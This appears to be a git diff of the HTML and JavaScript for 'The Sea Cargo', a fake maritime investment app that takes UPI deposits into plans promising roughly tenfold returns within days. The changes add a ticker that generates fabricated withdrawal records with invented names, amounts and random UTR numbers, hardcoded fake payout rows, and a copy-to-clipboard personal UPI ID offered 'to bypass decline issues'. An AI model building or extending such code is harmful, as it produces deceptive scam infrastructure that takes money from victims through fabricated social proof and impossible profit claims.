@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>The Sea Cargo - Maritime Freight Capital</title>
+  <title>The Sea Cargo - Maritime Asset Terminal</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -70,7 +70,7 @@
     <!-- Sign Up Form -->
     <div id="signupBox" class="bg-[#080d1a] border border-orange-500/20 rounded-3xl p-5 space-y-3.5 shadow-2xl">
       <div>
-        <label class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Account Identity / Full Name</label>
+        <label class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Full Legal Name</label>
         <input id="regUser" type="text" placeholder="Enter Full Name" class="w-full mt-1.5 bg-[#030712] border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white outline-none focus:border-[#ff7b00] transition">
       </div>
       <div>
@@ -81,7 +81,7 @@
         </div>
       </div>
       <div>
-        <label class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Create Password</label>
+        <label class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Create Access Password</label>
         <input id="regPass" type="password" placeholder="Minimum 6 characters" class="w-full mt-1.5 bg-[#030712] border border-white/10 rounded-xl px-3.5 py-2.5 text-xs text-white outline-none focus:border-[#ff7b00] transition">
       </div>
       <button onclick="handleRegister()" class="w-full bg-gradient-to-r from-[#ff6b00] via-[#ff8800] to-[#ffd000] text-black font-black py-3 rounded-xl text-xs active:scale-[0.98] transition shadow-lg tracking-wider uppercase mt-2">
@@ -89,7 +89,7 @@
       </button>
     </div>
 
-    <!-- Login Form with Strict Verification & Forgot Password -->
+    <!-- Login Form with Forgot Password Option -->
     <div id="loginBox" class="hidden bg-[#080d1a] border border-orange-500/20 rounded-3xl p-5 space-y-3.5 shadow-2xl">
       <div>
         <label class="text-[10px] uppercase font-bold text-gray-400 tracking-wider">Registered Mobile Number</label>
@@ -111,12 +111,12 @@
     </div>
   </div>
 
-  <!-- Forgot Password Reset Modal -->
+  <!-- Password Reset Modal -->
   <div id="forgotModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
     <div class="bg-[#080d1a] border border-orange-500/30 rounded-3xl p-5 w-full max-w-sm space-y-4 shadow-2xl">
       <div class="flex justify-between items-center border-b border-white/10 pb-3">
         <h3 class="text-xs font-black text-white uppercase tracking-wider flex items-center gap-2">
-          <i class="fa-solid fa-key text-[#ffd000]"></i> Reset Access Key
+          <i class="fa-solid fa-key text-[#ffd000]"></i> Reset Terminal Key
         </h3>
         <button onclick="closeModal('forgotModal')" class="text-gray-400 hover:text-white text-sm">✕</button>
       </div>
@@ -130,14 +130,14 @@
           <input id="forgotNewPass" type="password" placeholder="Enter new password" class="w-full mt-1 bg-[#030712] border border-white/10 rounded-xl px-3.5 py-2 text-xs text-white outline-none focus:border-[#ff7b00]">
         </div>
         <button onclick="handleResetPassword()" class="w-full bg-gradient-to-r from-[#ff7b00] to-[#ffd000] text-black font-black py-2.5 rounded-xl text-xs active:scale-95 transition uppercase tracking-wider shadow-md">
-          Update & Save Password
+          Save New Key
         </button>
       </div>
     </div>
   </div>
     <!-- ================= 2. MAIN APPLICATION ================= -->
   <div id="mainDashboard" class="hidden max-w-md mx-auto">
-    <!-- Top Header (Tap 5 times continuously on logo to trigger Admin Audit Desk) -->
+    <!-- Top Header -->
     <header class="sticky top-0 z-40 bg-[#030712]/95 backdrop-blur-md border-b border-white/10 px-4 py-3 flex justify-between items-center select-none">
       <h1 onclick="handleAdminSecretTap()" class="text-sm font-black text-white tracking-wider font-luxury uppercase cursor-pointer">
         THE SEA CARGO
@@ -159,7 +159,7 @@
     <main class="p-3.5 space-y-4">
       <!-- SECTION: HOMEPAGE -->
       <section id="sec-home" class="space-y-4">
-        <!-- CONTINUOUSLY AUTO-ROTATING MASKED LIVE WITHDRAWALS -->
+        <!-- LIVE WITHDRAWAL TICKER (WITH HARDCODED FALLBACK ROWS) -->
         <div class="bg-[#080d1a] border border-white/10 rounded-2xl p-3 shadow-lg">
           <div class="flex justify-between items-center mb-2 px-1">
             <span class="text-xs font-black text-white flex items-center gap-1.5">
@@ -170,11 +170,25 @@
             </span>
           </div>
           <div id="liveWithdrawTicker" class="space-y-1.5 text-xs min-h-[92px]">
-            <!-- Dynamically populated via JS -->
+            <div class="flex justify-between items-center bg-[#030712] p-2 rounded-xl border border-white/5 fade-item">
+              <span class="text-gray-300 font-semibold font-mono tracking-wider">R*****h</span>
+              <span class="text-[#00f589] font-black font-mono">₹3,500.00</span>
+              <span class="text-[9px] text-gray-500 font-mono">UTR: 492018***</span>
+            </div>
+            <div class="flex justify-between items-center bg-[#030712] p-2 rounded-xl border border-white/5 fade-item">
+              <span class="text-gray-300 font-semibold font-mono tracking-wider">V*****m</span>
+              <span class="text-[#00f589] font-black font-mono">₹4,800.00</span>
+              <span class="text-[9px] text-gray-500 font-mono">UTR: 781033***</span>
+            </div>
+            <div class="flex justify-between items-center bg-[#030712] p-2 rounded-xl border border-white/5 fade-item">
+              <span class="text-gray-300 font-semibold font-mono tracking-wider">A***y</span>
+              <span class="text-[#00f589] font-black font-mono">₹2,400.00</span>
+              <span class="text-[9px] text-gray-500 font-mono">UTR: 320914***</span>
+            </div>
           </div>
         </div>
 
-        <!-- Live Holdings & Wallet Actions -->
+        <!-- Settled Liquid Capital Banner -->
         <div class="bg-[#080d1a] p-4 rounded-2xl border border-orange-500/30 flex justify-between items-center shadow-lg">
           <div>
             <p class="text-[9px] uppercase font-bold text-gray-400 tracking-wider">Settled Liquid Capital</p>
@@ -190,104 +204,69 @@
           </div>
         </div>
 
-        <!-- ================= 8 CIRCULAR GOLDEN ICONS GRID (STORY TRIGGERS) ================= -->
+        <!-- ================= 8 ORIGINAL 3D GOLDEN CIRCULAR ICONS GRID ================= -->
         <div class="bg-[#080d1a] border border-white/10 rounded-2xl p-3.5 shadow-xl">
           <div class="grid grid-cols-4 gap-3 text-center">
             <!-- 1. About Us -->
             <button onclick="openStory(1)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M50 18 A 8 8 0 0 1 50 34 A 8 8 0 0 1 50 18 Z M45 34 H55 V78 H45 Z M25 56 C25 80 75 80 75 56" fill="none" stroke="#ffd000" stroke-width="6" stroke-linecap="round"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/Kcdkjw9p/01-About-Us.png" alt="About Us" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">About Us</span>
             </button>
 
             <!-- 2. Our Fleet -->
             <button onclick="openStory(2)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M20 62 L30 75 H70 L80 62 Z" fill="#ffd000"/>
-                  <rect x="35" y="38" width="30" height="20" rx="2" fill="#00f589"/>
-                  <path d="M50 25 V38" stroke="#ffffff" stroke-width="4"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/FbL8r1PW/02-Our-Fleet.png" alt="Our Fleet" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Our Fleet</span>
             </button>
 
             <!-- 3. Global -->
             <button onclick="openStory(3)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <circle cx="50" cy="50" r="30" fill="none" stroke="#ffd000" stroke-width="4"/>
-                  <path d="M20 50 H80 M50 20 C62 35 62 65 50 80 C38 65 38 35 50 20" fill="none" stroke="#ffd000" stroke-width="3"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/sht1GsT/03-Global.png" alt="Global" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Global</span>
             </button>
 
             <!-- 4. Safety -->
             <button onclick="openStory(4)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M50 20 L75 32 V54 C75 70 50 82 50 82 C50 82 25 70 25 54 V32 Z" fill="none" stroke="#ffd000" stroke-width="5"/>
-                  <path d="M42 50 L48 56 L62 42" fill="none" stroke="#00f589" stroke-width="5" stroke-linecap="round"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/jZGpL8yH/04-Safety.png" alt="Safety" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Safety</span>
             </button>
 
             <!-- 5. Plans -->
             <button onclick="openStory(5)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <rect x="30" y="25" width="40" height="52" rx="4" fill="none" stroke="#ffd000" stroke-width="4"/>
-                  <line x1="40" y1="40" x2="60" y2="40" stroke="#ffd000" stroke-width="3"/>
-                  <line x1="40" y1="52" x2="60" y2="52" stroke="#ffd000" stroke-width="3"/>
-                  <circle cx="64" cy="66" r="10" fill="#00f589"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/yF5ZTjDN/05-Plans.png" alt="Plans" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Plans</span>
             </button>
 
             <!-- 6. Partnership -->
             <button onclick="openStory(6)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M25 45 L40 60 L60 40 L75 55" fill="none" stroke="#ffd000" stroke-width="5" stroke-linecap="round"/>
-                  <circle cx="35" cy="35" r="5" fill="#ffd000"/>
-                  <circle cx="65" cy="35" r="5" fill="#ffd000"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/HLxDM6Z0/06-Partnership.png" alt="Partnership" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Partnership</span>
             </button>
 
             <!-- 7. Support -->
             <button onclick="openStory(7)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M28 50 C28 32 72 32 72 50 V65 H62 V52 H70" fill="none" stroke="#ffd000" stroke-width="4"/>
-                  <circle cx="50" cy="48" r="14" fill="#ffd000"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/99tCkJpV/07-Support.png" alt="Support" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Support</span>
             </button>
 
             <!-- 8. Updates -->
             <button onclick="openStory(8)" class="flex flex-col items-center group active:scale-95 transition">
-              <div class="w-14 h-14 rounded-full border-2 border-[#ffd000] p-0.5 shadow-md bg-black">
-                <svg viewBox="0 0 100 100" class="w-full h-full rounded-full">
-                  <circle cx="50" cy="50" r="48" fill="#071329"/>
-                  <path d="M35 40 L65 25 V75 L35 60 H25 V40 Z" fill="#ffd000"/>
-                  <path d="M72 40 C76 45 76 55 72 60" fill="none" stroke="#00f589" stroke-width="4"/>
-                </svg>
+              <div class="w-14 h-14 rounded-full overflow-hidden p-0.5 border border-[#ffd000]/60 bg-black shadow-lg">
+                <img src="https://i.ibb.co/39QgxPCv/08-Updates.png" alt="Updates" class="w-full h-full object-cover rounded-full">
               </div>
               <span class="text-[10px] font-bold text-gray-200 mt-1 truncate w-full">Updates</span>
             </button>
@@ -319,7 +298,7 @@
           <span class="text-[10px] font-bold text-orange-400 bg-orange-500/10 border border-orange-500/20 px-2 py-0.5 rounded-md">9 Plans Active</span>
         </div>
 
-        <!-- 2x2 PLANS GRID: PLANS 1 TO 4 (HIGH-CONTRAST HIGHLIGHTED INCOME) -->
+        <!-- 2x2 PLANS GRID: PLANS 1 TO 4 -->
         <div class="grid grid-cols-2 gap-3">
           <!-- PLAN 1: ₹350 -->
           <div class="plan-card flex flex-col justify-between">
@@ -426,7 +405,7 @@
             </div>
           </div>
 
-          <!-- PLAN 4: VIP ₹700 (Daily ₹750) -->
+          <!-- PLAN 4: VIP ₹700 (Daily ₹750, 10 Days) -->
           <div class="plan-card flex flex-col justify-between">
             <div class="p-2.5 bg-[#060a14] border-b border-white/5 flex justify-between items-center">
               <div>
@@ -461,7 +440,7 @@
             </div>
           </div>
         </div>
-                <!-- 2x2 PLANS GRID: PLANS 5 TO 9 -->
+                <!-- 2x2 PLANS GRID: PLANS 5 TO 8 & 9 -->
         <div class="grid grid-cols-2 gap-3 mt-3">
           <!-- PLAN 5: ₹900 (Daily ₹1000, 15 Days) -->
           <div class="plan-card flex flex-col justify-between">
@@ -498,7 +477,7 @@
             </div>
           </div>
 
-          <!-- PLAN 6: ₹1500 (Daily ₹1650, 20 Days) -->
+          <!-- PLAN 6: ₹1500 (Daily ₹1650, 14 Days) -->
           <div class="plan-card flex flex-col justify-between">
             <div class="p-2.5 bg-[#060a14] border-b border-white/5 flex justify-between items-center">
               <div>
@@ -522,18 +501,18 @@
                 </div>
                 <div class="flex justify-between items-center bg-[#ffd000]/10 border border-[#ffd000]/30 px-2 py-1 rounded-lg">
                   <span class="text-[9px] uppercase font-extrabold text-[#ffd000] tracking-wider">Total Income</span>
-                  <b class="text-sm font-black text-[#ffd000] font-mono">₹33000.00</b>
+                  <b class="text-sm font-black text-[#ffd000] font-mono">₹23100.00</b>
                 </div>
               </div>
 
               <div class="flex justify-between items-center text-[9px] text-orange-400/90 font-mono pt-0.5 px-0.5">
                 <span class="truncate">Colombo to Mundra</span>
-                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">20 Days</span>
+                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">14 Days</span>
               </div>
             </div>
           </div>
 
-          <!-- PLAN 7: ₹2500 (Daily ₹2700, 20 Days) -->
+          <!-- PLAN 7: ₹2500 (Daily ₹3900, 14 Days) -->
           <div class="plan-card flex flex-col justify-between">
             <div class="p-2.5 bg-[#060a14] border-b border-white/5 flex justify-between items-center">
               <div>
@@ -553,22 +532,22 @@
               <div class="bg-[#050914] p-2.5 rounded-xl border border-white/10 space-y-2 shadow-inner">
                 <div class="flex justify-between items-center bg-[#00f589]/10 border border-[#00f589]/30 px-2 py-1 rounded-lg">
                   <span class="text-[9px] uppercase font-extrabold text-[#00f589] tracking-wider">Daily Income</span>
-                  <b class="text-sm font-black text-[#00f589] font-mono">₹2700.00</b>
+                  <b class="text-sm font-black text-[#00f589] font-mono">₹3900.00</b>
                 </div>
                 <div class="flex justify-between items-center bg-[#ffd000]/10 border border-[#ffd000]/30 px-2 py-1 rounded-lg">
                   <span class="text-[9px] uppercase font-extrabold text-[#ffd000] tracking-wider">Total Income</span>
-                  <b class="text-sm font-black text-[#ffd000] font-mono">₹54000.00</b>
+                  <b class="text-sm font-black text-[#ffd000] font-mono">₹54600.00</b>
                 </div>
               </div>
 
               <div class="flex justify-between items-center text-[9px] text-orange-400/90 font-mono pt-0.5 px-0.5">
                 <span class="truncate">Port Klang to Mumbai</span>
-                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">20 Days</span>
+                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">14 Days</span>
               </div>
             </div>
           </div>
 
-          <!-- PLAN 8: ₹3000 (Daily ₹3300, 25 Days) -->
+          <!-- PLAN 8: ₹3000 (Daily ₹3300, 18 Days) -->
           <div class="plan-card flex flex-col justify-between">
             <div class="p-2.5 bg-[#060a14] border-b border-white/5 flex justify-between items-center">
               <div>
@@ -592,26 +571,26 @@
                 </div>
                 <div class="flex justify-between items-center bg-[#ffd000]/10 border border-[#ffd000]/30 px-2 py-1 rounded-lg">
                   <span class="text-[9px] uppercase font-extrabold text-[#ffd000] tracking-wider">Total Income</span>
-                  <b class="text-sm font-black text-[#ffd000] font-mono">₹82500.00</b>
+                  <b class="text-sm font-black text-[#ffd000] font-mono">₹59400.00</b>
                 </div>
               </div>
 
               <div class="flex justify-between items-center text-[9px] text-orange-400/90 font-mono pt-0.5 px-0.5">
                 <span class="truncate">Port Klang to Mumbai</span>
-                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">25 Days</span>
+                <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-1.5 py-0.5 rounded text-[8px] uppercase">18 Days</span>
               </div>
             </div>
           </div>
         </div>
 
-        <!-- PLAN 9: ₹25000 (Daily ₹3900, 29 Days) -->
+        <!-- PLAN 9: ₹3500 (Daily ₹3900, 18 Days) -->
         <div class="plan-card mt-3">
           <div class="p-2.5 bg-[#060a14] border-b border-white/5 flex justify-between items-center">
             <div>
               <p class="text-[9px] text-[#ffd000] font-black uppercase tracking-wider">Ultra Enterprise Plan 9</p>
               <h4 class="text-xs font-black text-white">Global Maritime Sovereign</h4>
             </div>
-            <span class="text-sm font-black text-[#ffd000] font-mono">₹25,000</span>
+            <span class="text-sm font-black text-[#ffd000] font-mono">₹3,500</span>
           </div>
           <div class="h-32 w-full bg-black relative overflow-hidden">
             <img src="https://i.ibb.co/SXWvYtN3/file-0000000016c88208aeb76faf8cda64a8.png" alt="Plan 9" class="w-full h-full object-cover">
@@ -627,16 +606,16 @@
               </div>
               <div class="bg-[#ffd000]/10 border border-[#ffd000]/30 p-2 rounded-lg text-center">
                 <span class="text-[8px] uppercase font-extrabold text-[#ffd000] block">Total Income</span>
-                <b class="text-sm font-black text-[#ffd000] font-mono">₹1,13,100.00</b>
+                <b class="text-sm font-black text-[#ffd000] font-mono">₹70,200.00</b>
               </div>
             </div>
             <div class="flex justify-between items-center text-[10px] text-orange-400 font-mono px-1">
               <span>Rotterdam to JNPT Harbor</span>
-              <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-2 py-0.5 rounded text-[9px] uppercase">29 Days</span>
+              <span class="bg-orange-500/20 border border-orange-500/30 text-orange-400 font-extrabold px-2 py-0.5 rounded text-[9px] uppercase">18 Days</span>
             </div>
           </div>
         </div>
-                <!-- ================= EXACT 6-CARD TRUSTED ACCREDITATION GRID ================= -->
+                <!-- ================= 6-CARD TRUSTED ACCREDITATION GRID ================= -->
         <div class="pt-6 space-y-3">
           <h2 class="text-base font-black text-white tracking-wide px-1">Trusted & Transparent Accreditation Grid</h2>
           <div class="grid grid-cols-2 gap-2.5">
@@ -667,7 +646,7 @@
           </div>
         </div>
 
-        <!-- 5 GOLD CERTIFICATES -->
+        <!-- 5 GOLD LUXURY CERTIFICATES -->
         <div class="pt-6 pb-2 space-y-3">
           <div class="flex justify-between items-center px-1">
             <h3 class="text-sm font-black text-white uppercase tracking-wider font-luxury">INSTITUTIONAL ACCREDITATIONS</h3>
@@ -789,7 +768,7 @@
     </div>
   </div>
 
-  <!-- RECHARGE / DEPOSIT MODAL WITH SLIP ATTACHMENT -->
+  <!-- RECHARGE / DEPOSIT MODAL WITH SLIP ATTACHMENT & COPY UPI OPTION -->
   <div id="rechargeModal" class="hidden fixed inset-0 z-50 bg-black/85 backdrop-blur-md flex items-center justify-center p-4">
     <div class="bg-[#080d1a] border border-orange-500/30 rounded-3xl p-5 w-full max-w-sm space-y-4 max-h-[90vh] overflow-y-auto shadow-2xl">
       <div class="flex justify-between items-center border-b border-white/10 pb-3">
@@ -822,6 +801,17 @@
           <button onclick="launchUpi('bhim')" class="bg-gradient-to-br from-orange-500/10 to-green-500/10 border border-white/15 p-3 rounded-2xl flex items-center gap-3 active:scale-95 transition shadow-lg">
             <div class="w-10 h-10 rounded-xl bg-gradient-to-br from-[#008744] to-[#ff7b00] flex items-center justify-center text-black text-xs font-black shadow-md">BHIM</div>
             <div class="text-left"><p class="text-xs font-black text-white">BHIM UPI</p><span class="text-[9px] text-[#00f589] font-bold">Instant</span></div>
+          </button>
+        </div>
+
+        <!-- 1-Click Copy UPI ID Card to Bypass Decline Issues -->
+        <div class="bg-[#030712] border border-orange-500/30 p-2.5 rounded-xl flex items-center justify-between mt-2.5">
+          <div>
+            <span class="text-[9px] text-gray-400 block font-bold uppercase">Manual Deposit UPI</span>
+            <span class="text-xs text-[#00f589] font-mono font-bold">thesolarinvest1@ybl</span>
+          </div>
+          <button onclick="copyMerchantUpi()" class="bg-[#ff7b00] text-black font-black px-3 py-1.5 rounded-lg text-xs active:scale-95 shadow">
+            Copy UPI
           </button>
         </div>
       </div>
@@ -888,10 +878,10 @@
   </div>
     <!-- ================= 4. APPLICATION JAVASCRIPT ================= -->
   <script>
-    // Master State Management
+    // Master State Management (Explicit 0.00 Initial Balance)
     const state = {
       user: null,
-      balance: 100.0,
+      balance: 0.0,
       totalDeposited: 0.0,
       totalWithdrawn: 0.0,
       totalInvested: 0.0,
@@ -905,17 +895,17 @@
     let usedUtrDatabase = JSON.parse(localStorage.getItem('seaCargoUsedUtrs') || '[]');
     let pendingDeposits = JSON.parse(localStorage.getItem('seaCargoPendingDeposits') || '[]');
 
-    // 9 MARITIME PLANS WITH NEW DAILY & TOTAL INCOME
+    // 9 MARITIME PLANS WITH UPDATED 14 & 18 DAYS TERMS
     const FLEET_PLANS = [
       { id: 1, planNo: "Plan 1", title: "Active Harbor Vessel", price: 350, daily: 350, days: 10, total: 3500 },
       { id: 2, planNo: "Plan 2", title: "Ocean Feeder", price: 450, daily: 450, days: 10, total: 4500 },
       { id: 3, planNo: "Plan 3", title: "VIP Offshore", price: 500, daily: 500, days: 10, total: 5000 },
       { id: 4, planNo: "Plan 4 (VIP)", title: "VIP Deep-Sea", price: 700, daily: 750, days: 10, total: 7500 },
       { id: 5, planNo: "Plan 5", title: "Harbor Express", price: 900, daily: 1000, days: 15, total: 15000 },
-      { id: 6, planNo: "Plan 6", title: "Pacific Carrier", price: 1500, daily: 1650, days: 20, total: 33000 },
-      { id: 7, planNo: "Plan 7", title: "Atlantic Fleet", price: 2500, daily: 2700, days: 20, total: 54000 },
-      { id: 8, planNo: "Plan 8", title: "Container Liner", price: 3000, daily: 3300, days: 25, total: 82500 },
-      { id: 9, planNo: "Plan 9 (Enterprise)", title: "Maritime Sovereign", price: 25000, daily: 3900, days: 29, total: 113100 }
+      { id: 6, planNo: "Plan 6", title: "Pacific Carrier", price: 1500, daily: 1650, days: 14, total: 23100 },
+      { id: 7, planNo: "Plan 7", title: "Atlantic Fleet", price: 2500, daily: 3900, days: 14, total: 54600 },
+      { id: 8, planNo: "Plan 8", title: "Container Liner", price: 3000, daily: 3300, days: 18, total: 59400 },
+      { id: 9, planNo: "Plan 9 (Enterprise)", title: "Maritime Sovereign", price: 3500, daily: 3900, days: 18, total: 70200 }
     ];
 
     // 8 UPLOADED DIRECT CDN STORIES
@@ -930,7 +920,7 @@
       8: { title: "Terminal Updates", img: "https://i.ibb.co/rLNLb7t/file-0000000011608208b0a9ded7b84238a1.png" }
     };
 
-    // Story Progress Timer
+    // Story Progress Engine
     let storyInterval = null;
     function openStory(id) {
       const story = STORIES_DATABASE[id];
@@ -951,7 +941,7 @@
           clearInterval(storyInterval);
           closeStory();
         }
-      }, 140); // 7 Seconds auto close
+      }, 140);
     }
 
     function closeStory() {
@@ -984,7 +974,7 @@
       } catch (e) {}
     }
 
-    // Dual UPI Rotation Engine
+    // Dual UPI Rotation
     const UPI_IDS = ["thesolarinvest1@ybl", "thecargo@slc"];
     let upiRotateIndex = 0;
     function getActiveUpiId() {
@@ -993,7 +983,7 @@
       return selectedVpa;
     }
 
-    // Clean PhonePe / GPay / Paytm Intent
+    // Clean PhonePe / GPay Intent
     function launchUpi(app) {
       const amtInput = document.getElementById("depAmount");
       const amount = (amtInput && amtInput.value) ? parseFloat(amtInput.value).toFixed(2) : "350.00";
@@ -1007,6 +997,13 @@
       if (app === 'bhim') appUrl = `bhim://pay?${upiParams}`;
       window.location.href = appUrl;
       setTimeout(() => { window.location.href = `upi://pay?${upiParams}`; }, 700);
+    }
+
+    function copyMerchantUpi() {
+      const vpa = "thesolarinvest1@ybl";
+      navigator.clipboard.writeText(vpa);
+      playTerminalChime('success');
+      alert(`UPI ID Copied: ${vpa}\n\nPaste in your UPI App to complete payment!`);
     }
 
     function handleSlipSelection(input) {
@@ -1248,6 +1245,31 @@
       `).join("");
     }
 
+    // Masked Live Withdrawals Engine
+    const maskedNames = ["R*****h", "V*****m", "A***y", "S*****a", "D****k", "M***j", "P***a", "R***t", "S****h", "A***t", "V***y", "K***n"];
+    const amountPool = [1200, 1850, 2400, 3100, 3500, 4200, 4800, 5200, 6500, 7500, 9200];
+    let currentIndex = 0;
+    function updateLiveWithdrawals() {
+      const ticker = document.getElementById("liveWithdrawTicker");
+      if (!ticker) return;
+      let html = "";
+      for (let i = 0; i < 3; i++) {
+        const nameIdx = (currentIndex + i) % maskedNames.length;
+        const amtIdx = (currentIndex + i * 2) % amountPool.length;
+        const randomUTR = Math.floor(100000 + Math.random() * 900000);
+        html += `
+          <div class="flex justify-between items-center bg-[#030712] p-2 rounded-xl border border-white/5 fade-item">
+            <span class="text-gray-300 font-semibold font-mono tracking-wider">${maskedNames[nameIdx]}</span>
+            <span class="text-[#00f589] font-black font-mono">₹${amountPool[amtIdx]}.00</span>
+            <span class="text-[9px] text-gray-500 font-mono">UTR: ${randomUTR}***</span>
+          </div>
+        `;
+      }
+      ticker.innerHTML = html;
+      currentIndex = (currentIndex + 1) % maskedNames.length;
+    }
+
+    // Daily Harbor Claim (+₹10.00)
     function dailyCheckIn() {
       state.balance += 10;
       playTerminalChime('bonus');
@@ -1258,7 +1280,7 @@
         btn.innerHTML = `<span class="text-[8px] text-green-400 font-black block">Claimed</span><b class="text-xs text-white">✓ Done</b>`;
         btn.classList.add("opacity-50", "cursor-not-allowed");
       }
-      alert("Harbor dividend of ₹10 credited!");
+      alert("Harbor dividend of ₹10.00 credited to your account!");
     }
 
     function renderFleetCountdowns() {
@@ -1423,6 +1445,8 @@
     function closeModal(id) { const el = document.getElementById(id); if (el) el.classList.add("hidden"); }
 
     window.addEventListener("DOMContentLoaded", () => {
+      updateLiveWithdrawals();
+      setInterval(updateLiveWithdrawals, 2500);
       setInterval(processPlanPayouts, 1000);
       setInterval(renderFleetCountdowns, 1000);
     });
